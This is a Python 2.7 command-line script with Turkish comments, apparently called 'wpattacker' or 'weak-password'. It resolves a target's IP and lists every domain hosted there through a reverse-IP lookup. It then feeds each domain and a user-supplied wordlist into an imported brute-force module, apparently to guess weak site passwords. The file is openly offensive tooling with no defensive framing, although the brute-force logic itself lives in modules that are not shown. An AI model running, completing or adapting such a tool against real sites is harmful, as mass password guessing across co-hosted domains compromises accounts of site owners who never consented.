
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import sys,os,time 
sys.path.append("./source/") # çalışma dizini için yol ekledik
import lookupip as lk #lookupip.py doseyamızı lk takma adı ile import ettik
import bruteforce as bf # bruteforce.py dosyamızı bf takma adı ile import ettik
if os.name == 'nt': # windows ise
	os.system('cls') # cls linuxtaki clear fonksiyonu 
else: # windows değilse
	os.system('clear') # clear,, terminali temizleyen komut
 
class Color(object): # Color Sınıfımız
 
	def __init__(self): # __init__
		self.red = "\033[31m" # kırmızı
		self.white = "\033[97m" # beyaz
		self.reset = "\033[0m" # resetleme
		self.bold = "\033[1m" # koyu yazma
		self.underline = "\033[4m" # alt yazili yazma
 
yazi = Color() # Örnekledik... 
 
class Help(object): # HELP sınıfımız
	def __init__(self):
		print yazi.bold+yazi.white+ "python file.py -u <link|ip adress> -w <text file>"+yazi.reset
		print yazi.underline+yazi.red+ "Example :\n" + yazi.reset
		print yazi.bold+yazi.red+ "python weak-password.py -u site.com -w ~/Desktop/cikti.txt\n"+yazi.reset
def start(link,filename): #start fonksiyonu
	lookup = lk.ReverseIpLookup() # ReverseIpLookup sınıfını örnekledik
	ret = lookup.gonder(link) # gonder fonksiyonuna link gönderdik
	if ret == -1: # dönen değer -1 mi ? 
		Help() # HELP direkt olarak sınıfı çağırır __init__ çalışır. 
		time.sleep(2) # 2 sn bekle
		sys.exit() # exit
	elif ret == -2: # ret -2 mi ? 
		print yazi.bold+yazi.red+"[!]  Ip engeli..."+yazi.reset # uyarı
		time.sleep(2) # 2 sn bekle
		sys.exit() # exit
	for domain ,bosluk in ret: # dönen domainArray
		calistir.run(domain,filename) #bruteforce için domainleri tek tek yolluyoruz
 
if __name__ == '__main__': # wpattacker.py çalışıyor mu ?
 
	if len(sys.argv) == 5: # argüman sayısı 5 mi ?
		if sys.argv[1] == "-u" and sys.argv[3] == "-w": # argv 1 ve argv 3 kontrol
			calistir = bf.Tarayici() # bruteforce.py dosyasındaki Tarayici sınıfını örnekledik
			start(sys.argv[2],sys.argv[4]) # start fonksiyonuna argümanları gönderdik
			#print sys.argv[4]
		else:
			Help() # yardım
	else:
		Help() # yardım
